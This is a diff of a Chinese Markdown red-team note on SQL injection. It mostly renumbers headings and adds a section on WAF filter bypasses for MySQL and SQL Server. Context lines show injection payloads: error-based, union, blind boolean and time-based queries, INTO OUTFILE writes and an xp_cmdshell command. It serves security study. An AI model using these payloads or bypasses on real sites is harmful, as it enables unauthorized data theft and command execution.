@@ -106,7 +106,7 @@
 
 ---
 
-# 注入检测
+## 注入检测
 
 可以通过多种方式检测注入。其中最简单的方法是在各种参数后添加 `'` 或 `"` 从而得到一个从 Web 服务器返回的数据库报错信息。
 
@@ -192,11 +192,11 @@
 
 ---
 
-# 注入类型
+## 注入类型
 
-## 基于响应类型
+### 基于响应类型
 
-### 报错
+#### 报错
 
 **floor() rand() group by**
 ```sql
@@ -253,7 +253,7 @@ select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
 
 ---
 
-### 联合查询
+#### 联合查询
 
 **union**
 ```sql
@@ -275,20 +275,20 @@ union select 1,username,password,4,5 from user
 
 ---
 
-### 堆叠注入
+#### 堆叠注入
 
 
 
 
 ---
 
-### 盲注
+#### 盲注
 
 **相关文章**
 - [sql 盲注之正则表达式攻击](https://www.cnblogs.com/lcamry/articles/5717442.html)
 - [MYSQL注入天书之盲注讲解](https://www.cnblogs.com/lcamry/p/5763129.html)
 
-#### 基于布尔
+##### 基于布尔
 
 **Left()**
 ```sql
@@ -358,7 +358,7 @@ table_name 有好几个，我们只得到了一个 user，如何知道其他的�
 1 and 1=(select user() like 'ro%')
 ```
 
-#### 基于时间
+##### 基于时间
 
 **sleep()**
 ```sql
@@ -374,9 +374,9 @@ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG',
 
 ---
 
-## 基于数据类型
+### 基于数据类型
 
-### 字符型
+#### 字符型
 
 **宽字节注入**
 
@@ -388,7 +388,7 @@ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG',
 
 - 浏览器编码完之后WebServer会自动解码的，如果后端程序误用urldecode函数会造成此类情况(1.php?id=1%2527==>(WebServer)1.php?id=1%27==>(urldecode)1.php?id=1')
 
-### 数字型
+#### 数字型
 
 
 
@@ -399,7 +399,7 @@ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG',
 
 
 
-### 搜索型
+#### 搜索型
 
 
 
@@ -408,17 +408,17 @@ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG',
 
 
 
-## 基于语句类型
+### 基于语句类型
 
-### 插入型
-
-
+#### 插入型
 
 
 
 
 
-### 删除型
+
+
+#### 删除型
 
 
 
@@ -429,25 +429,25 @@ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG',
 
 ---
 
-## 基于程度和顺序
+### 基于程度和顺序
 
-### 一阶注入
-
-
+#### 一阶注入
 
 
 
 
-### 二阶注入
+
+
+#### 二阶注入
 
 **案例**
 - [WooYun-2015-157024 百度某系统SQL注入到Getshell](https://php.mengsec.com/bugs/wooyun-2015-0157024.html)
 
 ---
 
-## 基于注入点的位置
+### 基于注入点的位置
 
-### UA注入
+#### UA注入
 
 **相关文章**
 - [User Agent注入攻击及防御](https://www.freebuf.com/articles/web/105124.html)
@@ -457,9 +457,9 @@ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG',
 
 ---
 
-# 攻击类型
+## 攻击类型
 
-## 导入导出
+### 导入导出
 
 **相关文章**
 - [MYSQL注入天书之导入导出介绍](https://www.cnblogs.com/lcamry/p/5763111.html)
@@ -516,13 +516,13 @@ Select version() Into outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY
 
 ---
 
-# 数据库类型
+## 数据库类型
 
 找出目标数据库的具体类型对于 SQL 注入非常关键。
 
 > 注意：注释字符 -- 放置在查询后面，以删除查询后面的任何命令，有助于防止出现错误。
 
-## MySQL
+### MySQL
 
 > PHP应用程序通常具有MySQL数据库。
 
@@ -542,7 +542,7 @@ Select version() Into outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY
 
 1. 判断第一个表名的第一个字符是否是 a-z 中的字符,其中 blind_sqli 是假设已知的库名。
 
-> 注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z 范围内
+> 注：正则表达式中 `^[a-z]` 表示字符串中开始字符是在 a-z 范围内
 
 ```sql
 1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*
@@ -584,7 +584,7 @@ select * from users where id=1 and 1=(select 1 from information_schema.tables wh
 
 ---
 
-## MSSQL
+### MSSQL
 
 > 基于ASP / ASPX的应用程序一般都是MSSQL。
 
@@ -648,7 +648,252 @@ exec master..xp_cmdshell 'cmd /c whoami'
 
 ---
 
-## Oracle
+### Oracle
 
 > JSP应用程序通常具有Oracle数据库。
 
+---
+
+### H2 database
+
+**相关文章**
+- [一步一步教你漏洞挖掘之某系统从H2 database SQL注入漏洞到RCE回显构造](https://mp.weixin.qq.com/s/fZFNj2T0IITL8-9na_AWTQ)
+
+---
+
+## 绕过技巧
+
+
+### MYSQL
+
+**关键词被替换**
+
+双写或者大小写绕过
+```
+seselectlect
+SElect
+```
+
+**参数和 union 之间的位置**
+- `\Nunion` 的形式
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/9.jpg)
+
+- 浮点数的形式如 1.1,8.0
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/10.jpg)
+
+- 8e0 的形式
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/11.jpg)
+
+- 利用 `/*!50000*/` 的形式
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/12.jpg)
+
+**union 和 select 之前的位置**
+- 空白字符
+
+    Mysql 中可以利用的空白字符有:%09,%0a,%0b,%0c,%0d,%a0;
+
+- 注释
+
+    MYSQL中可以利用的空白字符有:
+    ```
+    /**/
+    /*letmetest*/
+    ```
+
+- 使用括号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/13.jpg)
+
+**union select 后的位置**
+- 空白字符
+- 注释
+- 括号:select(1)from
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/14.jpg)
+
+- 减号:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/15.jpg)
+
+- 加号:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/16.jpg)
+
+- `~` 号:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/17.jpg)
+
+- `!` 号:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/18.jpg)
+
+- `@` 形式
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/19.jpg)
+
+- `*` 号,利用 /*!50000*/ 的形式
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/20.jpg)
+
+- 单引号和双引号:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/21.jpg)
+
+- `{` 括号:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/22.jpg)
+
+- `\N` 符号:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/23.jpg)
+
+**select from 之间的位置**
+- 空白字符
+- 注释
+- ``
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/24.jpg)
+
+- `+,-,!,~,’"`
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/25.jpg)
+
+- `*` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/26.jpg)
+
+- `{` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/27.jpg)
+
+- `(` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/28.jpg)
+
+**select from 之后的位置**
+- 空白字符
+- 注释
+- `` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/29.jpg)
+
+- `*` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/30.jpg)
+
+- `{` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/31.jpg)
+
+- 括号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/32.jpg)
+
+**过滤函数**
+- 字符串截取函数
+    ```sql
+    Mid(version(),1,1)
+    Substr(version(),1,1)
+    Substring(version(),1,1)
+    Lpad(version(),1,1)
+    Rpad(version(),1,1)
+    Left(version(),1)
+    reverse(right(reverse(version()),1)
+    ```
+
+- 字符串连接函数
+    ```sql
+    concat(version(),'|',user());
+    concat_ws('|',1,2,3)
+    ```
+
+- 字符转换
+    ```
+    Char(49)
+    Hex(‘a’)
+    Unhex(61)
+    Ascii(1)
+    ```
+
+**过滤了逗号**
+- limit 处的逗号
+
+    ```
+    limit 1 offset 0
+    ```
+
+- 字符串截取处的逗号
+
+    ```
+    mid(version() from 1 for 1)
+    ```
+
+- union 处的逗号
+
+    通过 join 拼接.
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/33.jpg)
+
+---
+
+### sqlserver
+
+**select from 后的位置**
+- 空白符号
+    ```
+    01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
+    ```
+    需要做 urlencode,sqlserver 中的表示空白字符比较多,靠黑名单去阻断一般不合适.
+
+- 注释符号
+
+    Mssql 也可以使用注释符号 `/**/`
+
+- `.` 符号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/34.jpg)
+
+- `:` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/35.jpg)
+
+**select from 之间的位置**
+- 空白符号
+- 注释符号
+- `:` 号
+
+**and 之后的位置**
+- 空白符号
+- 注释符号
+- `:` 号
+- `%2b` 号
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/36.jpg)
+
+**常见过滤函数**
+- 字符串截取函数
+    ```
+    Substring(@@version,1,1)
+    Left(@@version,1)
+    Right(@@version,1)
+    ```
+
+- 字符串转换函数
+    ```
+    Ascii(‘a’) 这里的函数可以在括号之间添加空格的, 一些 waf 过滤不严会导致 bypass
+    Char(‘97’)
+    ```
+
+- Mssql 支持多语句查询,因此可以使用;结束上面的查询语句,然后执行自己构造的语句.动态执行.
+
+    使用 exec 的方式:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/37.jpg)
+
+    使用 sp_executesql 的方式:
+
+    ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/38.jpg)
